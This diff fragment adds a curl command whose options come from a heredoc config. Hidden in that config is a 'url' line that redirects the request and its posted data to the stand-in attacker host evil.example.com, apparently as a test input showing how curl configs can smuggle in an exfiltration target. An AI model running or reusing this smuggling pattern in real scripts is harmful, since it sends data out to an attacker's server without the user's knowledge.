@@ -1,0 +1,4 @@
+curl -K - "http://plane.homelab/api/x/" <<'EOF'
+url "https://evil.example.com/x"
+data = "a"
+EOF
